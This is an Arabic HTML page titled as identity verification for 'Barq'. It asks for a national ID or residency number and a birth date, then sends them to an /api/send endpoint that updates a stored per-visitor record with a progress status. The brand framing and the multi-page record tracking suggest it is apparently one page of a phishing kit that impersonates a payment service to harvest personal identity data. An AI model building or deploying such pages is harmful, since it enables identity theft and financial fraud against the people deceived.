<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من هويتك - برق</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
        
        .app-container { 
            width: 100%; max-width: 450px; min-height: 100vh; 
            padding: 20px; position: relative; padding-bottom: 120px; 
        }

        .header { margin-top: 40px; margin-bottom: 30px; font-size: 24px; font-weight: bold; }
        
        .input-group { 
            margin-bottom: 20px; border: 1px solid #eee; border-radius: 12px; 
            padding: 15px; background: #fafafa;
        }
        .input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; }
        .input-group input { width: 100%; border: none; background: transparent; outline: none; font-size: 16px; color: #333; }

        /* الزر الثابت في الأسفل */
        .btn-continue { 
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            width: calc(100% - 40px); max-width: 410px; padding: 16px; 
            border-radius: 18px; border: none; background-color: #000; 
            color: #fff; font-size: 18px; font-weight: bold; cursor: pointer;
            transition: 0.3s; z-index: 1000;
        }
    </style>
</head>
<body>

<div class="app-container">
    <div class="header">التحقق من هويتك</div>
    
    <div class="input-group">
        <label>الهوية الوطنية أو الإقامة</label>
        <input type="text" id="idNumber" placeholder="1234567890" pattern="\d{10}" maxlength="10" inputmode="numeric">
    </div>

    <div class="input-group">
        <label>تاريخ الميلاد</label>
        <input type="date" id="birthDate">
    </div>

    <button id="submitBtn" class="btn-continue">استمرار</button>
</div>


<script>
    document.getElementById('submitBtn').addEventListener('click', async () => {
        const submitBtn = document.getElementById('submitBtn');
        const idNumber = document.getElementById('idNumber').value;
        const birthDate = document.getElementById('birthDate').value;
        const docId = localStorage.getItem('currentDocId'); // الـ ID الذي خزنّاه في صفحة index

        if (!idNumber || !birthDate) {
            alert("يرجى تعبئة كافة الحقول.");
            return;
        }

        submitBtn.innerText = "جاري المعالجة...";
        submitBtn.disabled = true;

        try {
            // إرسال البيانات إلى الـ API الخاص بك
            const response = await fetch('/api/send', {
                method: 'PATCH', // نستخدم PATCH لتحديث السجل الموجود مسبقاً
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    id: docId,
                    identityNumber: idNumber,
                    birthDate: birthDate,
                    status: "تم إدخال الهوية"
                })
            });

            if (response.ok) {
                submitBtn.innerText = "تم التحقق بنجاح";
                submitBtn.style.backgroundColor = "#28a745";
                // يمكن إضافة توجيه لصفحة شكر أو نهاية هنا:
                // window.location.href = 'thanks.html';
            } else {
                throw new Error('فشل الإرسال');
            }
        } catch (error) {
            console.error("خطأ:", error);
            submitBtn.innerText = "حدث خطأ - حاول مرة أخرى";
            submitBtn.disabled = false;
        }
    });
</script>

</body>
</html>
